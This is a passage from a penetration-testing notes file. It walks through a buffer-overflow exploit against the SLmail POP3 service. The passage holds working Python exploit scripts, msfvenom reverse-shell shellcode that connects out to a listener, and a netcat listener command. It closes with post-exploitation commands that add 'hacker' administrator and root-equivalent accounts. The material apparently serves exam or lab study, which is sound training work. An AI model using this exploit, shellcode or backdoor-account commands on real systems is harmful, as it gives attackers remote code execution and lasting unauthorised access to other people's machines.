t2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9" 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   s.connect( ( "10.11.14.166" , 110 ) )
   print(s.recv(1024))
   s.send("USER TEST\r\n")
   print(s.recv(1024))
   s.send("PASS " + buff + "\r\n")
   print("Done")

except:
   print("Error while connecting")
```
Once the the code runs the value stored in the EIP will be the value you want to plug into
`pattern_create`s sister program `pattern_offset`.  In this case the value is `39694438` in
hex or `8Di9` in ASCii.  You can use either of these with the program `pattern_offset`

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
[*] Exact match at offset 2606
```
or
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 8Di9
[*] Exact match at offset 2606
```
Use this to alter the exploit script to check if you have control of the EIP. The script
should look something like this.

```python
#!/usr/bin/python

import socket

buff = "A"*2606 + "BBBB" + "C"*90

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   s.connect( ( "10.11.14.166" , 110 ) ) 
   print(s.recv(1024))
   s.send("USER TEST\r\n")
   print(s.recv(1024))
   s.send("PASS " + buff + "\r\n")
   print("Done")

except:
   print("Error while connecting")
```

Run the exploit again and check that the EIP = `42424242`.  You can also check the stack
and see if the ESP points to the top of the `C`'s and right above them are the `B`'s.

You next want to check if we can extend our `C` buffer size any further.  We will need 350
to 400 bytes to load our payload and currently we only have 90 bytes.  Increase the size of
`C`'s in the exploit script and re-run it.
```python
#!/usr/bin/python

import socket

buff = "A"*2606 + "BBBB" + "C"*(3600-2606-4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   s.connect( ( "10.11.14.166" , 110 ) )
   print(s.recv(1024))
   s.send("USER TEST\r\n")
   print(s.recv(1024))
   s.send("PASS " + buff + "\r\n")
   print("Done")

except:
   print("Error while connecting")
```
Make sure that you get enough `C`'s in the debugger before moving on.

Now we need to check which characters are allow in the input stream.  The script
[SLmail-pop3-v2.py](bufferOverflow/SLmail-pop3-v2.py) does just that.
```python
#!/usr/bin/python

import socket

badchars = (
   "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
   "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
   "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F"
   "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F"
   "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F"
   "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F"
   "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F"
   "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F"
   "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F"
   "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F"
   "\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF"
   "\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF"
   "\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF"
   "\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF"
   "\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF"
   "\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
      )

buff = "A" * 2606 + "B" * 4 + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   s.connect( ( "10.11.14.166" , 110 ) )
   print(s.recv(1024))
   s.send("USER TEST\r\n")
   print(s.recv(1024))
   s.send("PASS " + buff + "\r\n")
   print("Done")

except:
   print("Error while connecting")

```
Each time you don't get the entire string in memory, remove the offinding character and
try again.

Now you need to load you shell code in the overwritten space where your `C`'s are.  To do
this you will need to load an address of a command of either

```asm
jmp esp
```
or
```asm
push esp
retn
```
To find these you will need to use mona in the windows imunity-debugger.  In the command
bar at the bottom of the window type `!mona modules`.  You want to look for a module that
has Rebase, SafeSEH, ASLR, and NXCompat set to false.  You also need to make sure that the
address wouldn't contain any offinding characters in it.  In other words, if you found a
module but the address range was `00fb6800` to `00fba880` you most likly would not be able
to use it because any command in that module would require a `\x00` character or `null`
that would kill anything after it.

Once you have found one click on the `e` in the upper debugger bar and look for the module
you found.  double click on the module and it will load it into the debugger.  Next right
click in the code window and goto `Search for` -> `Command`.  Type in `jmp esp` and hit
enter.  If you find one great, if not then right click again and goto `Search for` -> 
`Sequence of commands` and use the `push esp` and `retn`.

If you still don't find one thats OK. Your search will have only have been done on the
`text` section of the module.  You can check that by clicking on the `m` in the upper tool
bar in the debugger. and looking for the module you selected. It should have `R E ` under
the access column for the text section. This means that it could be read and executed.
However, because we chose a module that had no memory protection we can use code from
places other then the text section.  First we need to konw the hex code for the command
`jump esp`.  To find that we will use the NASM shell.
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 
```
We can now use `mona` again to search for this opcode.

Using `!mona find -s "\xFF\xE4" -m slmfc.dll`
Of course replace the string and the module with the one you would use.

Make sure the address is usuable. In the debugger tool bar look for the left arrow next to 
vertical 3 dots and enter the address of the command and ensure that it is there.  While
you are in the code you might as well select the line with `jmp esp` and press `f2` to
set a break point.  Next replace your `B`'s in the exploit code with the address of the
command you want to use like so.
```python
#!/usr/bin/python

import socket

buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C"*(3600-2606-4) 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   s.connect( ( "10.11.14.166" , 110 ) )
   print(s.recv(1024))
   s.send("USER TEST\r\n")
   print(s.recv(1024))
   s.send("PASS " + buff + "\r\n")
   print("Done")

except:
   print("Error while connecting")
```
Notice that the address should be backwards because of the Little endian format. The
address as found in the debugger would have been `5f4a358f`.  Run the code again and make
sure that you jump to the right place in the debugger.  Press `f7` in the debugger to step
into the next peice of code.  You should now be executing the `C`'s which is the comand
`INC EBX`.

We now want to generate shell code to launch a reverse shell to a listing NetCat instance.
We will generate this with a metasploit program called `msfvenom`

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.1 LPORT=443 -f c -a x86 --platform=windows
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of c file: 1386 bytes
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x01\x01\x68"
"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
```
This peice of code will mostlikly have bad characters in it. We can get rid of them by
encodeing it and specifying which characters not to use.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.1 LPORT=443 -f c -a x86 --platform=windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xd9\xc1\xbd\x01\x8b\xdd\xbd\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x6f\x17\x03\x6f\x17\x83\xee\x77\x3f\x48\x0c\x6f\x42"
"\xb3\xec\x70\x23\x3d\x09\x41\x63\x59\x5a\xf2\x53\x29\x0e\xff"
"\x18\x7f\xba\x74\x6c\xa8\xcd\x3d\xdb\x8e\xe0\xbe\x70\xf2\x63"
"\x3d\x8b\x27\x43\x7c\x44\x3a\x82\xb9\xb9\xb7\xd6\x12\xb5\x6a"
"\xc6\x17\x83\xb6\x6d\x6b\x05\xbf\x92\x3c\x24\xee\x05\x36\x7f"
"\x30\xa4\x9b\x0b\x79\xbe\xf8\x36\x33\x35\xca\xcd\xc2\x9f\x02"
"\x2d\x68\xde\xaa\xdc\x70\x27\x0c\x3f\x07\x51\x6e\xc2\x10\xa6"
"\x0c\x18\x94\x3c\xb6\xeb\x0e\x98\x46\x3f\xc8\x6b\x44\xf4\x9e"
"\x33\x49\x0b\x72\x48\x75\x80\x75\x9e\xff\xd2\x51\x3a\x5b\x80"
"\xf8\x1b\x01\x67\x04\x7b\xea\xd8\xa0\xf0\x07\x0c\xd9\x5b\x40"
"\xe1\xd0\x63\x90\x6d\x62\x10\xa2\x32\xd8\xbe\x8e\xbb\xc6\x39"
"\xf0\x91\xbf\xd5\x0f\x1a\xc0\xfc\xcb\x4e\x90\x96\xfa\xee\x7b"
"\x66\x02\x3b\x2b\x36\xac\x94\x8c\xe6\x0c\x45\x65\xec\x82\xba"
"\x95\x0f\x49\xd3\x3c\xea\x1a\xd6\xcb\xf5\xdb\x8e\xc9\xf5\xda"
"\xf5\x47\x13\xb6\x19\x0e\x8c\x2f\x83\x0b\x46\xd1\x4c\x86\x23"
"\xd1\xc7\x25\xd4\x9c\x2f\x43\xc6\x49\xc0\x1e\xb4\xdc\xdf\xb4"
"\xd0\x83\x72\x53\x20\xcd\x6e\xcc\x77\x9a\x41\x05\x1d\x36\xfb"
"\xbf\x03\xcb\x9d\xf8\x87\x10\x5e\x06\x06\xd4\xda\x2c\x18\x20"
"\xe2\x68\x4c\xfc\xb5\x26\x3a\xba\x6f\x89\x94\x14\xc3\x43\x70"
"\xe0\x2f\x54\x06\xed\x65\x22\xe6\x5c\xd0\x73\x19\x50\xb4\x73"
"\x62\x8c\x24\x7b\xb9\x14\x54\x36\xe3\x3d\xfd\x9f\x76\x7c\x60"
"\x20\xad\x43\x9d\xa3\x47\x3c\x5a\xbb\x22\x39\x26\x7b\xdf\x33"
"\x37\xee\xdf\xe0\x38\x3b";
```
The encodeing process takes a little stake space to preform so we can't just copy this code
to our buffer we first need to give it a little room to work with.  We can do that with a
no-op slide.  The opcode for no-op is `\x90` so the final working script
[SLmail-pop3-final](bufferOverflow/SLmail-pop3-final.py) would look like this:
```python
#!/usr/bin/python

import socket

shellcode = (
"\xd9\xc1\xbd\x01\x8b\xdd\xbd\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x6f\x17\x03\x6f\x17\x83\xee\x77\x3f\x48\x0c\x6f\x42"
"\xb3\xec\x70\x23\x3d\x09\x41\x63\x59\x5a\xf2\x53\x29\x0e\xff"
"\x18\x7f\xba\x74\x6c\xa8\xcd\x3d\xdb\x8e\xe0\xbe\x70\xf2\x63"
"\x3d\x8b\x27\x43\x7c\x44\x3a\x82\xb9\xb9\xb7\xd6\x12\xb5\x6a"
"\xc6\x17\x83\xb6\x6d\x6b\x05\xbf\x92\x3c\x24\xee\x05\x36\x7f"
"\x30\xa4\x9b\x0b\x79\xbe\xf8\x36\x33\x35\xca\xcd\xc2\x9f\x02"
"\x2d\x68\xde\xaa\xdc\x70\x27\x0c\x3f\x07\x51\x6e\xc2\x10\xa6"
"\x0c\x18\x94\x3c\xb6\xeb\x0e\x98\x46\x3f\xc8\x6b\x44\xf4\x9e"
"\x33\x49\x0b\x72\x48\x75\x80\x75\x9e\xff\xd2\x51\x3a\x5b\x80"
"\xf8\x1b\x01\x67\x04\x7b\xea\xd8\xa0\xf0\x07\x0c\xd9\x5b\x40"
"\xe1\xd0\x63\x90\x6d\x62\x10\xa2\x32\xd8\xbe\x8e\xbb\xc6\x39"
"\xf0\x91\xbf\xd5\x0f\x1a\xc0\xfc\xcb\x4e\x90\x96\xfa\xee\x7b"
"\x66\x02\x3b\x2b\x36\xac\x94\x8c\xe6\x0c\x45\x65\xec\x82\xba"
"\x95\x0f\x49\xd3\x3c\xea\x1a\xd6\xcb\xf5\xdb\x8e\xc9\xf5\xda"
"\xf5\x47\x13\xb6\x19\x0e\x8c\x2f\x83\x0b\x46\xd1\x4c\x86\x23"
"\xd1\xc7\x25\xd4\x9c\x2f\x43\xc6\x49\xc0\x1e\xb4\xdc\xdf\xb4"
"\xd0\x83\x72\x53\x20\xcd\x6e\xcc\x77\x9a\x41\x05\x1d\x36\xfb"
"\xbf\x03\xcb\x9d\xf8\x87\x10\x5e\x06\x06\xd4\xda\x2c\x18\x20"
"\xe2\x68\x4c\xfc\xb5\x26\x3a\xba\x6f\x89\x94\x14\xc3\x43\x70"
"\xe0\x2f\x54\x06\xed\x65\x22\xe6\x5c\xd0\x73\x19\x50\xb4\x73"
"\x62\x8c\x24\x7b\xb9\x14\x54\x36\xe3\x3d\xfd\x9f\x76\x7c\x60"
"\x20\xad\x43\x9d\xa3\x47\x3c\x5a\xbb\x22\x39\x26\x7b\xdf\x33"
"\x37\xee\xdf\xe0\x38\x3b"
      )
buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3600-2606-4-351-16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   s.connect( ( "10.11.14.166" , 110 ) ) 
   print(s.recv(1024))
   s.send("USER TEST\r\n")
   print(s.recv(1024))
   s.send("PASS " + buff + "\r\n")
   print("Done")

except:
   print("Error while connecting")
```
You should now be able to use this to get a reverse shell.  You should first follow this in the
debugger to ensure that it works the way you want it to.  To get the shell you will need to set
up an instance of netcat to listen on port 443.
```bash
nc -nlvp 443
```
This will work but when you exit the shell the program will crash.  To avoid this you can add
a option to `msfvenom` to have it exit the thread instead of the progam.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.134 LPORT=443 EXITFUNC=thread -f c -a x86 --platform=windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

## Compiling Windows EXE on linux

You can use `i686-w64-mingw32-gcc` to compile a window execuiteable on a linux machine.  You
can then use `wine` to execute it.



### Usefull Windows commands

List all users on a windows box
```
net users
```

List specific info about a user
```
net user user-name
```

Add a user
```
net user hacker /add
net user hacker hacked
```

Add user to the admin group
```
net localgroup Administrators hacker /add
```

Add user to the remote desktop group
```
net localgroup "Remote Desktop users" hacker /add
```

look for running processes
```
tasklist
```


Find a file on the system.
```
dir c:\ /s /b | find "file.txt"
```
* /s - Tells `dir` to do a recursive traversival
* /b - does a basic printing.
* find - forceces only printing matiches to the given string.

Download registery
```
regedit /e full.reg
```
Can also download specific keys files like so
```
c:\winnt\regedit.exe /e winvnc3.reg "HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3"
```

Use VNC viewer
```
vncviewer
```
when the box pops up asking for the server type in the IP addressa and hit shift enter.
If it ask you to hit ctrl+alt+del you can hit f8 and select that from the menue that pops
up.


## Usefull Reverse shell hacks

Get bash like prompt and usability on a NetCat reverse shell on Linux

STDERR Redirect. Error messages will not be sent the the reverse shell unless you use
redirection.  For both Linux and Windows the syntax is `COMMAND 2>&1`

```bash
ls -al /usr/bin/ 2>&1
```

```dos
dir c:\ /b /s | find "proof.txt" 2>&1
```

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

## Usefull Linux Commands

Add a user with root privilages
```bash
sudo useradd -g root -u 0 -o -s /bin/bash hacker
```
* -g sets the groop
* -u sets the user ID
* -o Allows for non unique User ID
* -s selects bash as the default shell
* hacker is the user name

next set the new user password with:
```bash
sudo passwd hacker
```
or
```bash
echo "usrname:pass" | chpasswd
```

Change user from the command line
```bash
su - username
```
Will need the users password and if no user is specified then `root` will be the selected
user.

If you get the error 'xterm-256color': unknown terminal type.
```bash
export TERM=xterm
```

